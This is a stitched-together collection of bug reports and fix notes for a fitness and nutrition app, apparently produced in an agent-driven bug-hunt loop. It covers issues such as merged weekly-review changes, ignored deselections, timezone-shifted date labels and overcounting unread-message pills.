fix.description: Root cause: badge-unlock toasts were de-duplicated by the badge's display NAME, so if two different badges shared a display name in the same unlock check, the second real unlock was silently swallowed (no toast). Fix: de-dup now keys on each badge's stable key (falling back to the name for keyless callers), so every distinct badge unlock shows its own toast exactly once. This is a logic fix with no visible screen change, so the attached proof is a summary card (root cause + fix + regression test).

[bug-hunt] Notifications list — tapping several backend-persisted scheduled-reminder notifications does NOTHING (dead tap), because the in-app tap handler's type switch was never updated to cover them, even though the SAME types deep-link correctly when tapped from the OS push tray.

WHERE: src/pages/Notifications.tsx handleNotificationClick (lines 386-467). When meta_data.link is absent it falls to a switch on notification.type; there is NO case for these persisted types, so they hit `default: break` and never navigate. getIconForType/getColorForType also lack them, so the rows render a generic gray Bell icon.

The backend persists an in-app Notification row for EVERY type via send_notification -> create_notification (nyu_backend/app/services/notification_service.py:366-377, called even when the push is suppressed), so these rows DO appear in the list:

The push-tap path (src/capacitor/push.ts pushNotificationActionPerformed, lines 229-279) DOES route every one of these types, which proves both the intended destinations and that the in-app list simply drifted out of sync with the push handler.

issues.description:
[bug-hunt] Weekly-review runs TWO decision-tree engines back-to-back and MERGES their proposed changes, but they use DIFFERENT field-name vocabularies, so the dedup misses collisions -> duplicate/contradictory calorie cards (both applied, last-wins) + a steps card that never applies.

WHERE: app/services/weekly_review.py:440-490 runs weekly_review_engine.analyze_week() (main) then adjustment_engine.generate_weekly_adjustment() (adjustment) each nightly review + on /reviews routes (routes/reviews.py:116,225). The merge de-dups adjustment changes against the main set by the `field` key:
    existing_fields = {c.get("field") for c in engine_changes}
    for ac in adj_changes: if ac.get("field") not in existing_fields: engine_changes.append(ac)   (weekly_review.py:487-490)
But the two engines name the SAME concept differently:
  * Calories: main field="target_calories" (weekly_review_engine.py:775) vs adjustment field="calories" (adjustment_engine.py:186/306/388/447). BOTH carry category="calories".
  * Steps: main field="daily_steps_goal" (weekly_review_engine.py:749) vs adjustment field="steps_goal" (adjustment_engine.py:272). BOTH carry category="activity".

EXPECTED: one shared field vocabulary (or dedup by category/concept) so a single calorie/step change is proposed and applied.
ACTUAL:
(1) DUPLICATE CALORIE CARDS, BOTH APPLIED: for a stalled fat-loss user w/ good adherence both engines fire (main decision_path=plateau_step1/2, adjustment change_type=stall_intervention). decision_path != on_track so the merge takes the `elif adj_changes` branch; adjustment field "calories" is NOT in {target_calories,carbs_g,fat_g} -> appended. proposed_changes now has TWO category=calories cards w/ different targets (e.g. 2000->1900 from main AND 2000->1850 from adjustment). The Monday applier _apply_macro_change (weekly_review.py:1169) dispatches on category=="calories" -> macros.calories_kcal=int(value), so BOTH apply and the LAST (adjustment, appended last) silently overrides. User sees two conflicting Calories X->Y cards; the "N of M changes will take effect" toast overcounts.
(2) DEAD STEPS CARD: _apply_activity_changes (weekly_review.py:1091-1110) only handles field=="daily_steps_goal"; the adjustment engine's field=="steps_goal" hits the else -> logger.warning("Unknown activity field: steps_goal") and is NEVER applied. So an adjustment step-goal proposal is shown to the user but silently discarded on apply.

REPRO (code trace): fat_loss plan, 2+ weekly reviews with weight within noise, adherence>=80%, review.avg_daily_steps populated -> both engines emit calorie/step changes -> weekly_review.py:487 appends adjustment's "calories"+"steps_goal" alongside main's "target_calories"+"daily_steps_goal" -> apply doubles the calorie change (last wins) and drops the steps one.

FIX: unify the field names across the two engines (adjustment -> target_calories / daily_steps_goal), OR dedup by category instead of field. NOT a dup of w7q3 (that was the applier ignoring per-change deselection); this is the engine-merge producing duplicate/dead changes upstream.

fix.description: Root cause: the adjustment engine named calorie/step changes with a different field vocabulary (field 'calories'/'steps_goal') than the main engine ('target_calories'/'daily_steps_goal'), so weekly_review.py's field-based merge dedup missed the collision — two contradictory calorie cards both applied (last-wins) and the steps card hit 'Unknown activity field' and never applied. Fix: extracted RULE 3 into _stall_intervention() and renamed every calorie/step field to the main engine's vocabulary so the merge collapses to a single calorie/step change and the steps card is applied. issues.description:
[bug-hunt] Weekly adjustment engine's stall protocol jumps straight to a CALORIE CUT (with a false "steps not tracked" message) for fat-loss users who ARE tracking steps at/above their goal but below the 12k ceiling.

WHERE: app/services/adjustment_engine.py RULE 3 stall-intervention branch (lines ~259-374). The NEAT-first tiering is:
    if avg_steps < current_steps_goal:            -> propose step increase (Step 1)   (:269)
    elif avg_steps >= STEP_TARGET_CEILING(12000): -> reduce calories (Step 2)          (:290)
    else:  # comment: "Steps data not available, go straight to calorie reduction"     (:349)
           -> 100 kcal cut + insight "Track step count so we can use NEAT increases in the future"

The `else` fires not only when steps are genuinely absent, but ALSO when avg_steps IS present and either (a) current_steps_goal is None (no ActivityTarget row), or (b) avg_steps >= goal but < 12000 (e.g. goal 8000, user averaging 9000).

EXPECTED: when steps are tracked and sit between the goal and the 12k ceiling, propose raising the step TARGET toward 12k first (the engine's own "increase NEAT before touching calories" tier), and never print "Steps data not available"/"Track step count" when review.avg_daily_steps exists.
ACTUAL: immediate calorie reduction + misleading "not tracked" copy, even though review.avg_daily_steps is populated (weekly_review.py:517). These feed real proposed_changes that auto-apply Monday.

REPRO (code trace): fat_loss stalled user, adherence>=80%, review.avg_daily_steps=9000, ActivityTarget.daily_steps_goal=8000 -> RULE 3: first if false (9000>=8000), elif false (9000<12000) -> else branch -> 100 kcal cut + "Track step count...". Code-proven; adjustment_engine is live via weekly_review.py:458 nightly generation + routes/reviews.py.

FIX: split the else into (i) genuinely-no-steps (avg_steps is None) -> keep current copy, and (ii) steps present but >= goal and < ceiling -> propose stepping the goal toward STEP_TARGET_CEILING before any calorie cut.

Fix (adjustment_engine.py RULE 3): split the else — steps tracked & below ceiling now propose raising daily_steps_goal toward 12k (NEAT before calories) and never print the 'not tracked' copy; only avg_steps==None keeps the conservative calorie cut + track-steps prompt. issues.description:
[bug-hunt] Weekly Review "Approve N of M" (deselect changes) is silently ignored — the Monday auto-apply job applies ALL originally-proposed changes regardless of what the user kept.

Expected: deselecting a proposed change then tapping "Approve N of M" applies ONLY the kept changes to next week (the UI even promises "N of M changes will take effect Monday").
Actual: every AI-proposed change is applied to week N+1 anyway; the deselected ones take effect too.

Root cause (traced both repos):
- FE AcceptChangesFlow.tsx: each ProposedChange.id is the index into proposed_changes (backend reviews.py _normalize_proposed_changes sets id=str(i)). Deselecting + tapping the primary button fires handleSubmit("approve_selected") with approved_change_ids = Array.from(selectedIds) (the kept subset).
- review.service.ts:144 maps approve_selected -> POST /reviews/:id/modify { modified_changes: approved_change_ids }.
- Backend modify_review (app/routes/reviews.py:317) stores review.user_modified_changes = modified_changes and sets status="reviewed"; it does NOT prune review.proposed_changes.
- Monday job weekly_plan_apply (app/services/weekly_review.py:825) processes status in (reviewed, notified); it loads proposed = json.loads(review.proposed_changes) (the FULL original list, line 857) and applies EVERY item via _apply_macro_change / _apply_activity_changes (lines 895-908). It NEVER reads review.user_modified_changes.

So a user who explicitly rejects e.g. an aggressive calorie cut still gets it applied to next week WeeklyMacroTarget; the "N of M changes will take effect Monday" toast (AcceptChangesFlow.tsx:56) is false.

Repro: active plan with a generated weekly review having 2+ proposed changes -> open /weekly-review -> deselect one change -> tap "Approve N of M" -> Monday weekly_plan_apply applies all proposed changes to week N+1.

Fix: in weekly_plan_apply, when review.user_modified_changes is set (modify path), filter proposed to only the indices listed in user_modified_changes before applying (change ids are str(index) into proposed_changes). reject_all is already handled (status stays / no apply), but partial-select currently behaves identically to approve_all.

Fix: the job now honors your choice: approve-selected applies only the changes you kept, a full reject applies nothing (next week stays a clean copy of this week), and approve-all still applies everything. Backend fix deployed to prod with regression tests.

[bug-hunt] AI "Customize Meal" leaves the user with an un-appliable meal preview (dead-end).

The ONLY Apply/Discard controls live in the floating "Macro change" bar, which is gated on a non-null macro delta: `{macroDelta && updatedMeal && (...)}` (AIMealCustomization.tsx:531). The preview card itself carries NO buttons (comment at :517-520: "Apply/Discard live ONLY in the floating macro-delta bar"), and the text input is hidden whenever a preview exists via `{!updatedMeal && (...)}` (:582).

`macroDelta` (useMemo :269-280) returns null in two reachable cases:
1. No original snapshot: `originalMeal` stays null when the backend start payload omits `meal` AND the first `updated_meal` omits `original` (both optional in the UpdatedMeal type, ai.service.ts:410-427; the code even guards `if (!originalMeal && result.updated_meal.original)` :209, and the start comment :146-148 says only "some sessions" include the seed meal). With originalMeal null, macroDelta short-circuits to null (:270).

Actual: preview with no actionable control -> stuck.

[bug-hunt] AI Overview (/ai/overview) — the Weight tile paints its weekly-change trend arrow with a LOSS-BIASED good/bad color that ignores the user’s goal direction, so for a muscle-gain / weight-gain goal it is semantically inverted.

Root cause: weightChangeIndicator() (src/pages/AIOverview.tsx:43-47) hardcodes, regardless of goal_type:
  change < -0.1  -> text-success (green), ArrowDown   (weight DOWN treated as good)
  change >  0.1  -> text-destructive (red), ArrowUp   (weight UP treated as bad)
The returned color is applied to the trend arrow icon at AIOverview.tsx:379 (<WInd className={... wInd.color} />).

Expected: for a user whose goal is to GAIN (goal_type muscle_gain, or goal_weight above current), gaining should read as ON-TRACK (green) and losing as OFF-TRACK. The primary Dashboard weight card is already goal-progress-framed (start->now->goal milestone track, QA i-20260617-86ba) and is NOT loss-biased; this tile diverges.

Actual: a weight-gain user who successfully gains sees a RED (destructive) up-arrow implying the gain is bad; if they lose weight they get a GREEN “good” down-arrow. Color is the good/bad state signal here and it is wrong-signed for the entire gaining segment.

issues.description:
[bug-hunt] Dashboard Sleep card + its embedded 7-day chart render the night’s DATE LABEL one day early for users in negative-UTC (Americas) timezones.

Root cause: date labels are built with new Date("YYYY-MM-DD"), which parses a bare date string as UTC midnight; toLocaleDateString / the recency compare then shift it back a day in any timezone west of UTC.
- DashboardSleepCard.recencyLabel  (src/pages/_components/dashboard/DashboardSleepCard.tsx:26)  ->  new Date(latestDate).toLocaleDateString(...)
- SleepQualityChart.formatLabel    (src/components/charts/SleepQualityChart.tsx:32)             ->  new Date(dateStr).toLocaleDateString(...)  (every X-axis label)

Expected: a night logged/synced on Jul 16 shows "Jul 16".
Actual (e.g. America/Los_Angeles, UTC-7): shows "Jul 15"; the Today/Last-night recency check can also mis-classify near midnight.

The codebase already fixed this exact class elsewhere: DashboardFastingCard uses new Date(`${date}T00:00:00`) (local) and lib/cycle.ts uses Date.UTC on split parts. The newer sleep code (i-20260716-sl33) reintroduced the naive parse.

Same naive pattern (wrong WEEKDAY label) also in: src/components/charts/StepsActivityChart.tsx:26, MacroAdherenceChart.tsx:26, CalorieBalanceChart.tsx:26.

Fix: parse the YYYY-MM-DD as local before formatting (append T00:00:00, or split+Date.UTC then format) — ideally add a shared parseLocalDate() helper in src/lib/date.ts and use it in all label formatters. Correct for IST (UTC+5:30) today, so India users are unaffected; only surfaces west of UTC.

Repro: set browser/device TZ to America/Los_Angeles, log or Health-Connect-sync sleep for 2+ days, open /dashboard — the Sleep card’s most-recent date reads one day earlier than logged.

[bug-hunt] Body Measurements ignores an imperial user’s unit_preference when the profile cache is cold — the cm/inch default fix is incomplete.

What’s wrong: src/pages/Measurements.tsx seeds the unit toggle ONCE at mount by reading the React-Query cache for key [profile-basic-info] (L78-81): cached?.unit_preference === imperial ? inch : cm. But this component never FETCHES [profile-basic-info] — it queries [user-profile] (L95-99, profileService.getProfile) and [measurements-overview]. There is NO effect that re-derives `unit` once the profile resolves. So when the [profile-basic-info] cache is empty at mount, an imperial user is shown centimetres and stays on cm until they manually toggle.

Expected vs actual: An imperial (unit_preference=imperial) user opening Measurements should default to inch. Actual: defaults to cm whenever [profile-basic-info] wasn’t already cached by a prior screen.

The recent fix (commit 595b3015 “Measurements cm/inch default respects unit_preference”, +5/-1 lines) added only the cache read — it works when the cache is warm (e.g. after visiting Profile/LogWeight which DO fetch that key) but does nothing on a cold cache. issues.description:
[bug-hunt] Body Measurements save-failure handler calls an undefined function -> ReferenceError instead of the intended error toast.

What's wrong: src/pages/Measurements.tsx line 244 (logMeasurementMutation.onError) does  description: apiErrorMessage(error) ?? "Please try again." , but apiErrorMessage is NOT imported in this file - line 8 imports only { apiErrorRaw } from '@/lib/api-error'. apiErrorMessage is a real export of that module (api-error.ts:38) but is never imported here and not defined locally.

Proof: npx tsc -b reports  src/pages/Measurements.tsx(244,22): error TS2304: Cannot find name 'apiErrorMessage'.  It still ships because npm run build is a vite/esbuild build with no typecheck (same class + gotcha as i-20260716-1d76 / i-20260621-8625).

Expected vs actual: on a failed measurement save (network error / 5xx / offline / validation) the user should get the destructive toast 'Couldn't save measurement'. Instead, evaluating the toast() argument throws ReferenceError: apiErrorMessage is not defined before toast() is invoked, so NO error toast renders and the failure surfaces only as an uncaught console error. captureException (line 240, which uses the imported apiErrorRaw) still runs, so the crash is silent to the user.

Proof: forcing POST /measurements/log to 500 now renders the destructive 'Couldn't save measurement' toast with the server's message.

That zero-baseline normalization is right for count-like metrics (calories 0-2500, workouts 0/1) but wrong for weight, whose day-to-day variation is a tiny fraction of its absolute value. [bug-hunt] Plan Timeline lifecycle wrongly shows "Resumed" as the current state for plans that were only EDITED, never paused.

Component: src/pages/PlanTimeline.tsx → PlanStateMachine (the Draft → Active → Paused → Resumed → Completed pill row), route /plan-timeline.

WHAT’S WRONG: isResumed is derived purely from the version number — `const isResumed = currentStatus === "active" && (plan.version ?? 0) > 1;` (PlanTimeline.tsx:479). But plan.version is bumped by MANY operations, not just resume: add/swap/remove a meal or exercise (nyu_backend/app/routes/plan_edits.py `_bump_version`), macro/goal change and revert (app/routes/plans.py:314/469/758), and weekly-review apply (app/routes/reviews.py:293/913). Pause and resume are only two of the version-bumping paths (plans.py:979 pause, :1077 resume).

So an ACTIVE plan that a user customized even ONCE (e.g. added a single meal → version 2) but NEVER paused is treated as resumed:
• the "Resumed" chip is highlighted as the current state (isCurrent at :486, `state.key === "resumed" && isResumed`),
• the "Active" chip is NOT highlighted (:487 requires `!isResumed`),
• tapping "Resumed" reads "Resumed (version 2)." (timestampForState :538-539), implying a pause→resume cycle that never happened.

EXPECTED: "Active" highlighted; "Resumed" shown only after a genuine pause→resume.
ACTUAL: any edited-but-never-paused active plan shows "Resumed".

REPRO: create/finalize a plan (version 1, active) → add one meal or change a macro target (version → 2, still active, never paused) → open /plan-timeline → the lifecycle pill row highlights "Resumed" and its tooltip says "Resumed (version 2).".

SEVERITY: LOW-MED (misleading plan-lifecycle display; not destructive). Triggers for essentially every user who customizes their plan or receives a weekly-review update.

FIX: derive resumed state from a real pause/resume signal (e.g. a resumed_at timestamp / pause-history flag from the plan record) rather than `version > 1`. If no such field is exposed, /plans/active should surface one; do not infer resume from version.

issues.description:
[bug-hunt] Partner group chat "N new messages" pill overcounts — it counts group EVENTS and your OWN messages, not just incoming partner messages.

Component: src/components/partners/PartnerChatThread.tsx (used by PartnerGroupHub, /partners/:groupId → Chat tab)

WHAT'S WRONG: The unread pill ("↓ N new messages", PartnerChatThread.tsx:501-521) should surface only NEW INCOMING partner messages that arrived while you were scrolled up. But the counter (useEffect at :333-353) computes `delta = items.length - prevItemsLengthRef` over the MERGED `items` array (events + messages, built at :287-304) with NO sender and NO kind filter. When `delta > 0` and you are not at the bottom it does `setUnreadCount((n) => n + delta)`.

Two over-counts result:
1. GROUP EVENTS count as "messages". The events query (["partner-group", groupId, "events"]) is refetched live whenever a partner logs a meal / starts or finishes a session / logs a set / the leader changes the plan (PartnerGroupHub.tsx:133-159 socket→invalidateQueries). Each new event grows `items`, so while you are scrolled up the pill can read "2 new messages" when ZERO messages arrived — those are meal-logged / member-joined / plan-change event cards, not messages.
2. YOUR OWN messages count. Partner chat has NO optimistic local append — a message you send only renders when it echoes back on the `partner_group_message` socket event (PartnerGroupHub.tsx:191-198 → setLiveMessages). That echo grows `items`; sending does not auto-scroll (handleSend never scrolls), so if you were scrolled up reading history and send from the pinned composer, the pill increments "1 new message" for your own message.

The render layer already distinguishes both dimensions — isFromMe (`(msg.is_from_me) ?? senderId === currentUserId`, :458-460) and event-vs-message (`item.kind`) — but the unread counter ignores both and keys purely off `items.length`.

EXPECTED: pill counts only newly-arrived items where `item.kind === "message"` AND the message is not from the current user; wording "N new messages" then matches reality.
ACTUAL: counts every new item including events and your own echoes; the "N new messages" label is wrong when the new items are events.

SAME CLASS as fixed i-20260717-7c1d (coach-chat "N new" pill counted own/collapsed messages) but a DIFFERENT component: CoachChat used useChatScroll (fixed there); PartnerChatThread has its own unread logic that was never given the same guard. Not a duplicate of 7c1d — different file, different route.

REPRO: open a partner group with ≥2 members → Chat tab → scroll UP away from the bottom, then either (a) have another member log a meal or the leader push a plan change (an event arrives), or (b) type in the pinned composer and send a message. The pill shows "N new messages" counting those events / your own message rather than only incoming partner messages.

SEVERITY: LOW (misleading count/label on the partner-group chat surface; tapping the pill still scrolls to bottom correctly).

FIX: in the :333-353 delta effect, track the previous count over the filtered incoming-message list (`items.filter(it => it.kind === "message" && !isFromMe(it.message))`), not raw `items.length`; increment unread only by newly-appended incoming partner messages. Mirrors 7c1d's visibleMessages + !is_from_me fix.

[bug-hunt] Coach Wellness Check-in: every 1-10 scale question is pre-answered "5" and can be submitted without the user ever touching it, logging a fabricated 5/10.

Where: src/components/blocks/WellnessCheckinBlock.tsx (rendered inside coach chat as a wellness_checkin interactive block). Reproducible in the dev block gallery with the "mood-only" fixture (src/pages/dev/chatBlockFixtures.ts:758 - two scale_1_10 questions, nothing else).

Root cause: the answers state initializer seeds every scale_1_10 question to 5 (WellnessCheckinBlock.tsx:261, `if (q.type==="scale_1_10") init[q.id]=5`). Two consequences:
1) `allAnswered` treats a scale question as answered whenever `typeof val==="number"` (line 275) - true from mount - so the "Submit Check-in" button is ENABLED before any interaction (line 420 gates on !allAnswered).
2) ScaleQuestion renders the chip whose value===5 with aria-checked=true + a purple selection ring (lines 61-84, value defaults to 5) before the user picks anything.
So a user who taps Submit without touching a scale question logs answer:5 for it, and the chip visually claims 5 was chosen.

This is the SAME class as the fixed DailyCheckinBlock mood bug (QA i-20260710-9d3b): DailyCheckinBlock.tsx:35-38 explicitly starts mood UNSELECTED (null) with the rule "a chip must never render selected (aria-checked=true) for a value that would not be submitted; displayed == submitted". WellnessCheckin scale questions violate the spirit of that fix - the rating is auto-filled and auto-submittable, so the coach receives a 5/10 the athlete never actually gave.

EXPECTED: scale_1_10 questions start unselected (no chip aria-checked), and Submit stays disabled until the user picks a value for each required scale/choice question - a rating the user never chose must not render selected or be submitted.
ACTUAL: scale chip "5" is pre-highlighted, allAnswered is true at mount, Submit is enabled immediately, and submitting logs answer:5 for untouched scales.

REPRO: 1) open the dev chat-block gallery and select the wellness_checkin "mood-only" fixture (or trigger a coach wellness check-in whose questions are scale_1_10). 2) observe both "5" chips already highlighted and "Submit Check-in" already enabled. 3) tap Submit without touching any chip. 4) the block forwards responses with answer:5 for every scale question - a value the user never selected.

(Aside, not the bug: the mood/energy/food score extraction at lines 297-304 keys off q.id, but real payloads use generic ids like "q1"/"m1" while the keywords live in q.question, so mood_score/energy_score are effectively never populated - dead code, no data loss since the full responses array is always sent.)

Impact: LOW - data-quality/consistency gap; wellness check-ins feed coach calibration, so a fabricated 5/10 for skipped scales pollutes that signal. No crash. Consistent with an already-fixed sibling bug (9d3b).

When today has a workout and last night's sleep ran short of your own trailing 7-day average, Activity shows one calm line directly above the session: 'Slept 5.2h vs your 7.2h average - consider a lighter session today.' Deliberately advice, not an alarm - muted card, no red, dismissible for the day, and it hides once every exercise is handled. issues.description:
[bug-hunt] Coach Chat "N new" pill overcounts — it counts your OWN messages and messages that never render.

Route: /coach-chat

What is wrong: the floating "N new ↓" pill (CoachChatNewMessagePill, aria-label "N new messages, tap to scroll down") should count INCOMING coach/AI messages that arrived while you scrolled up. Its count is driven by useChatScroll, which computes delta = messages.length - prevCount over the RAW messages array (CoachChat.tsx:225 passes the `messages` state, NOT `visibleMessages`). When !isAtBottom and delta>0 it does setUnreadNewCount(c => c + delta) (useChatScroll.ts lines 84-121) with no sender or visibility check.

The raw messages array contains items the thread never shows as new incoming bubbles: (a) the user's OWN outgoing messages (is_from_me), (b) block_response envelopes filtered out by isBlockResponseEnvelope, (c) dev test pings filtered by isTestSeedMessage, and (d) consecutive rate-limit bubbles / duplicate welcomes / identical AI echoes collapsed by useVisibleMessages. So the pill count can exceed the number of newly-rendered incoming bubbles, and it appears for the user's own actions.

Expected: pill count = number of NEW INCOMING (coach/AI) bubbles actually rendered while scrolled up; it must not appear for the user's own sends or for hidden/collapsed messages.

Actual: the pill overcounts / appears spuriously.

Repro (clearest): open /coach-chat with enough history to scroll; scroll up so you are not at the bottom (isAtBottom=false); then either (i) tap an interactive block the coach sent (e.g. a mood/rating check-in) which sends a block_response envelope, or (ii) send a normal message. The '1 new ↓' pill appears even though the added item is your own — and for the block_response case nothing new renders at all (the envelope is filtered by useVisibleMessages).

Root cause / fix: derive the unread delta from the rendered visibleMessages and count only incoming (!is_from_me) additions. useChatScroll currently keys off raw messages.length; feed it visibleMessages (or track a per-render count of incoming visible bubbles) so the pill count matches what tapping it actually reveals.

Files: src/pages/CoachChat.tsx:225 (passes raw messages to useChatScroll); src/pages/_components/coach-chat/hooks/useChatScroll.ts:84-121 (delta from raw length, no sender/visibility filter); src/pages/_components/coach-chat/hooks/useVisibleMessages.ts (filters/collapses that make raw != rendered); src/pages/_components/coach-chat/CoachChatNewMessagePill.tsx.

issues.description:
[bug-hunt] AI plan-wizard number_input does NOT clamp the typed value to the min/max it advertises — the wizard sends an out-of-range answer to the coach.

Where: src/components/ai/InteractiveElement.tsx, the number_input branch (lines ~222-269). Used by the AI Activity/Diet plan wizards (AIWizardShell) at /ai/create-activity-plan and /ai/create-diet-plan whenever the backend sends a ui_element of type number_input with min/max.

Root cause: the field renders element.min/element.max as the HTML input min/max attrs AND as visible "Min: X  Max: Y" hints (lines 250-255), presenting a hard range to the user. But the Confirm handler (lines 256-261) does `const val = numberValue || String(element.default ?? 0); onRespond(val);` with NO clamp. HTML min/max attributes do not prevent TYPING an out-of-range number (they only affect the spinner + :invalid styling), so a typed value outside [min,max] is sent verbatim.

EXPECTED: confirming clamps the value into [element.min, element.max] (or blocks confirm) so the coach never receives an impossible answer for a question it framed as bounded.
ACTUAL: type e.g. 99 into a number_input whose hint says "Min: 1  Max: 7", tap Confirm -> onRespond("99") fires; the AI then either builds a nonsensical plan around 99 or has to re-ask, wasting a wizard turn (and an LLM call / rate-limit budget).

REPRO: 1) open an AI plan wizard (/ai/create-activity-plan). 2) reach any step where the coach sends a bounded number_input (renders the boxed input with "Min/Max" row). 3) type a value above the max (or below the min). 4) tap Confirm. 5) observe the out-of-range value is submitted unchanged.

FIX: in the Confirm onClick, clamp before responding, e.g. `const n = Number(numberValue); const clamped = Number.isFinite(n) ? Math.min(element.max ?? n, Math.max(element.min ?? n, n)) : n; onRespond(String(clamped));` (guard when min/max are undefined). Related same-class edge (optional, not required): the slider branch seeds sliderValue from element.default which, if the backend ever sends a default outside [min,max], would also submit out-of-range until the user drags — clamp the initial value too.

Impact: LOW — bounded-answer correctness gap in the AI wizards; no crash, but it defeats the range the UI promises and can burn a wizard turn / LLM call.

fix.description: Root cause: InteractiveElement number_input Confirm sent the raw typed value; HTML min/max attrs don't block typing out-of-range, so the coach received impossible answers (e.g. 99 for a Min:1/Max:7 step). Fix: clamp with Math.min(max, Math.max(min, n)) in the Confirm onClick before onRespond (guarded when min/max undefined), and clamp the initial sliderValue seed for the same class. Proof: dev harness types 99 into a Min:1/Max:7 input -> Confirm -> onRespond receives '7'. Verified by 3 new unit tests in test/InteractiveElement.test.tsx; 31/31 green.

judge.note: Exact root cause fixed (no clamp in Confirm handler); minimal guarded clamp Math.min/Math.max; also fixed the optional slider default edge named in the report. Proven visually (99->7 in dev harness) AND by 3 new unit tests, 31/31 green. Low-impact bounded-answer correctness gap, no side effects.

[bug-hunt] The pseudo-locale xx-AE never actually renders — the documented "manual QA via ?lng=xx-AE" path silently shows English, defeating the pseudo-locale overflow / missing-key guard.

Root cause: src/i18n/config.ts initI18n() sets `supportedLngs: ["en", "hi", "hinglish"]` (line 76) which OMITS "xx-AE", even though SUPPORTED_LOCALES (line 35) and the resources map (line 56) both include it, and the code comment (lines 91-92) explicitly states xx-AE is "for tests / manual QA via ?lng=xx-AE". With `load: "currentOnly"` and xx-AE absent from supportedLngs, i18next filters the locale out and falls back to en.

EXPECTED: requesting xx-AE (via ?lng=xx-AE, or nyus_locale=xx-AE in localStorage) renders the inflated/accented pseudo strings so text-overflow bugs and missing translation keys surface loudly.

fix.description: BUILT — the one gap this audit found and left open. You asked to 'label what's being worked on', and the honest answer at the time was that there WAS no in-progress state: an open card read 'Submitted / Awaiting fix' for the entire time an agent was fixing it, and nothing stopped a second concurrent tick from grabbing the same card and duplicating the work. Both are now solved by a claim. (1) A tick claims an issue before touching code, and the board shows a blue '⏳ In progress' pill with who holds it and how long is left — screenshot shows it next to a normal 'Submitted' card for contrast. Blue is the one colour no other lifecycle badge uses, so it can't be confused with Needs direction or In review. (2) Claiming a card another agent already holds now FAILS and names the holder, so a second tick picks something else instead; 'pull' also withholds their cards and reports them separately. (3) The important part: claims EXPIRE. Expiry is judged whenever a claim is read, so an agent that dies mid-fix — usage limits, crash — frees the card by itself with nothing for you to clean up, and a malformed claim counts as no claim. A lock that could get stuck would park an issue forever, which is worse than the duplicate work it prevents. Timeout is 60 min, adjustable in data/loop.json (claimTtlMinutes). Verified live on this very card: claim stamped it, a second agent's attempt was rejected by name, pull dropped it from 15 open to 14 and listed it as claimed-by-others, --force took it over, and a lapsed claim rendered as plain 'Submitted' again with no pill. 12 contract tests in tools/claims.test.mjs. Docs: LOOP.md section 2.1 + README.

issues.description:
[bug-hunt] Activity: daily_volume_history mis-attributes an IN-PROGRESS session's volume to the wrong calendar day, making the week-dots row lie about which day had a workout.

Root cause: backend.py ~L8417 (ActivityOverview) buckets daily volume by func.date(WorkoutSessionLog.started_at) == day_date, with NO requirement that the session be completed. session_count (L8427) correctly filters on completed_at instead. Live cross-check today (2026-07-17, QA main acct):
- GET /activity/overview?day=2026-07-17: todays_workout is an in-progress session (session_id 3808 'Push', session_number 3, is_complete:false) with total_volume_today_kg=7890 (7 exercises logged, 2 skipped).
- Same response's daily_volume_history has a Jul 16 entry: {volume: 7890, session_count: 0} — the exact volume of TODAY's unfinished session, bled back one day, with session_count correctly at 0 (no completed session that day).
- GET /activity/history?page=1&limit=10 (completed-sessions source of truth) shows Jul 16 as {sessions_count:0, total_volume_kg:0} and has no session at all for Jul 16 in its sessions[] list — confirming Jul 16 had zero real activity and the 7890 is purely a started_at artifact from today's still-open session.

Impact: TodaysActivityCard's weekDots (FE, hasSession = point.volume>0) will show Jul 16 as a completed workout day when nothing happened that day, while today (Jul 17, where the user is actually mid-workout) shows nothing yet since the session isn't finished — a day-shifted, self-correcting-only-on-finish illusion. Any late-night session (start before midnight, most sets logged after) reproduces this for real users, not just this timing artifact.

Fix (backend): bucket daily_volume_history by the completed session's date (or by SetLog.logged_at if per-set timestamps exist) instead of WorkoutSessionLog.started_at, and only include volume from sessions with completed_at set (matching session_count's own filter) — or clearly document/accept in-progress volume under TODAY's bucket regardless of started_at. Needs backend deploy; flagging per loop policy (never touch backend prod from this loop).

Verified live on prod (QA acct): Jul 16 now volume:0/sessions:0 instead of the bled 7890; week-dots row (capture) shows no phantom workout day. Deployed to prod (backend commit ecfa430).

issues.description: [bug-hunt] Health-score consistency pillar counts weight LOGS not distinct weigh-in DAYS, unlike the other 3 sub-metrics. nyu_backend/app/services/health_score.py:396-403 - daily_count/meal_count/workout_count all use func.count(func.distinct(...log_date)) (distinct calendar days), but weight_count uses func.count(WeightLog.id) (raw rows), then weight_cov = min(100, weight_count/8*100). A user who logs weight 8x in one sitting (re-weighs, corrects an entry) hits 100% weight coverage without weighing in on more than 1-2 actual days, while an honest once-every-4-days logger for the whole month can score lower despite better real-world coverage. Skews the 25%-weighted consistency pillar and the overall composite score. Fix: change weight_count query to func.count(func.distinct(func.date(WeightLog.logged_at))) to match the other 3 metrics' distinct-day semantics.

issues.description: [bug-hunt] Health-score body-comp trajectory has a dead zone for a mild weight GAIN against a loss goal - it scores identically to a plateau. nyu_backend/app/services/health_score.py:318-334 (_body_comp_pillar): for target<0 (loss goal), the -8 gaining-against-goal penalty only fires when weekly_pct > 0.005 (+0.5%/wk), and the stagnant/plateau branch only fires when abs(weekly_pct) < 0.0025 (+-0.25%/wk). A user trending +0.25%/wk to +0.5%/wk against their own loss goal falls through both branches and gets trajectory=0, same score as someone who is perfectly flat - even though they are moving the wrong direction. Likely an unintentional gap between the two threshold bands. Fix: either widen the stagnant band to meet the penalty band (e.g. stagnant covers up to 0.005) or add a small penalty for the gap zone so 'trending wrong way, not yet at -8 threshold' scores below true stagnation.
